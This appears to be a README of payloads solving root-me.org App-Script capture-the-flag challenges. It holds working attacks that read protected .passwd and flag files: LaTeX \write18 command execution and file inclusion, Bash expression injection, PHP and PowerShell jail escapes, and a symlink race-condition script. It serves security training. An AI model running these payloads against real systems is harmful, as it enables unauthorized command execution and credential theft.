# root-me.org-payloads - App Script 

## What is it ?

Some [root-me.org](https://www.root-me.org/) payloads

## R: Code Execution
[R Code Execution challenge](https://www.root-me.org/en/Challenges/App-Script/R-Code-Execution)

### Payload 
```R
read.table("/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt", sep = "\t", header = TRUE)
```

## LaTeX - Input
[LaTeX - Input challenge](https://www.root-me.org/fr/Challenges/App-Script/LaTeX-Input)

### Payload 

First create a latex file :

```bash
vi /tmp/pwned.tex
```
Then copy this payload on the file :

```LaTex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```
Then execute the script passing this latex file in argument :
```bash
./setuid-wrapper /tmp/pwned.tex
```

Then retrieve the output pdf with scp :
```bash
scp app-script-ch23@challenge02.root-me.org:/tmp/YOUR_OUPUT_FILE /~
```

The flag should be printed on it

## LaTeX - Command execution
[LaTeX - Command execution challenge](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

### Payload
Do the same as the above but in your latex file copy this payload :

```LaTex
catcode `\_=12
\documentclass{article}
\begin{document}
\immediate\write18{cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd > /tmp/buffer.tmp}
\input{/tmp/buffer.tmp}
\end{document}
```

## Powershell - SecureString
[PowerShell - SecureString challenge](https://www.root-me.org/fr/Challenges/App-Script/Powershell-SecureString)

### Payload
```Powershell
([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.Int
eropServices.Marshal]::SecureStringToBSTR($SecurePassword)))
```

## Powershell - Basic jail
[PowerShell - Basic jail challenge](https://www.root-me.org/fr/Challenges/App-Script/Powershell-Basic-jail)

### Payload
Just type 
```Powershell
Content
```
Then in the prompter type
```bash 
./.passwd
```
Then enter and the flag will be prompt 

### Bash - quoted expression injection
[Bash - quoted expression injection](https://www.root-me.org/fr/Challenges/App-Script/Bash-quoted-expression-injection)

### Payload
```bash
'x[$(echo `cat .passwd`))]'
```
You will get an error message with the flag inside

### PHP - Jail
[PHP - Jail](https://www.root-me.org/fr/Challenges/App-Script/PHP-Jail)

### Paylaod 

First we can get the source code of the script with the following command :
```php 
echo show_source(getenv(SHELL));
```

After sanitizing it we get the following script :

![Source code of the jail](https://image.noelshack.com/fichiers/2024/01/1/1704119452-screenshot-from-2024-01-01-15-30-39.png)

We can see that many php functions are blocked by the regex, with this command we can get the list of all the functions available :
```php
print_r(get_defined_functions())
```

We can see that [base64](https://www.php.net/manual/en/function.base64-decode.php) functions are available as well as [implode](https://www.php.net/manual/en/function.implode.php) and [glob](https://www.php.net/manual/en/function.glob.php). Let's try this command :

![Glob command in php](https://image.noelshack.com/fichiers/2024/01/1/1704120632-screenshot-from-2024-01-01-15-50-21.png)

In this command we pass the value of '/challenge/app-script/ch13/*' encoded in base64 to an array then with the function implode we join the array into a string and we do a glob.
The result of this command will be :
```php 
print_r(glob(/challenge/app-script/ch13/*,GLOB_ONLYDIR));
```

We can see that there is a subfolder /passwd. We do the same command in the /passwd subfolder :
```php
print_r(glob(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy4q)))))
```

![Glob command in php](https://image.noelshack.com/fichiers/2024/01/2/1704201285-screenshot-from-2024-01-02-14-14-02.png)

We can see that there is a .passwd file so we just now have to open it with the following command:

```php 
echo show_source(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q))));
```

Wich will be interpreted as :
```php
echo show_source(/challenge/app-script/ch13/passwd/.passwd);
```
### BASH - Race condition
[BASH - Race condition](https://www.root-me.org/fr/Challenges/App-Script/Bash-race-condition)

### Payload

First create a file in /tmp folder :

```bash
vi /tmp/pwned.sh
```
Then give it the rights :
```bash
chmod u+x /tmp/pwned.sh
```
 
Then copy the following script in the file :
```bash
#!/bin/bash

DIRECTORY="/tmp/$PPID/$1"
echo "Checking in: $DIRECTORY"

while :; do
    if [ -d "$DIRECTORY" ]; then
        if [ "$(ls -A "$DIRECTORY")" ]; then
            DIR_PATTERN="tmp.*"
            FOUND_DIRS=$(find "$DIRECTORY" -type d -name "$DIR_PATTERN")

            if [ -n "$FOUND_DIRS" ]; then 
                kill -SIGSTOP $1
                echo -n "data" > $FOUND_DIRS/pwned_file
                kill -SIGCONT $1
                ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                while : ; do
                    kill -SIGSTOP $1
                    unlink $FOUND_DIRS/pwned_file
                    echo -n "data" > $FOUND_DIRS/pwned_file
                    kill -SIGCONT $1
                    ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                    [[ -e "$FOUND_DIRS" ]] || break
                done
                break
            else
                echo "No directories found matching pattern '$DIR_PATTERN' in $DIRECTORY."
            fi
        else
            echo "Directory $DIRECTORY exists but is empty."
        fi
    else
        echo "Directory $DIRECTORY does not exist."
    fi
done
```

This scipts do a infinite loop and monitor the directories created by the challenge script, when he found a directory in /tmp that matchs he creates a symlink to $HOME/.passwd
in order to do a race condition exploit on this command of the challenge script :
```bash 
find "$temp_dir" -type f -size 4c -exec cat {} + 
```

As stated here [Race condition with exec](https://www.gnu.org/software/findutils/manual/html_node/find_html/Race-Conditions-with-_002dexec.html)

Then lauch it like this :
```bash
~/wrapper & /tmp/pwned.sh $!
```

Where $! is the pid of the processus ~/wrapper
At the moment, the race is not always won by the script so relaunch it until you have a valid flag

